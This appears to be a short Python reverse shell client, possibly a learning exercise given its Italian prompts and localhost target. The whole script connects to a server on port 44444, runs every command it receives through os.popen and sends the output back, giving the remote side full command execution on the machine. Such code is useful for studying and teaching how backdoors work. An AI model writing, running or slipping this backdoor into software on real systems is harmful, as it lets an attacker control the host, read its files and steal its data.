import socket as so
import os

SRV_ADDR = "127.0.0.1"
SRV_PORT = 44444

clients = so.socket(so.AF_INET, so.SOCK_STREAM)
clients.connect((SRV_ADDR, SRV_PORT))

while True:
    output = os.popen("pwd").read().rstrip() + " $ "
    clients.sendall(output.encode("utf-8"))
    data = clients.recv(1024)
    if not data: break
    cmd = data.decode("utf-8").rstrip()
    if cmd == "help":
        clients.sendall("Esegui qualsiasi comando\n".encode('utf-8'))
    elif cmd == "ciao":
        clients.sendall(b"Come stai?\n")
    else:
        output = os.popen(cmd).read() + "\n"
        clients.sendall(output.encode('utf-8'))
    print(data.decode("utf-8"))
clients.close()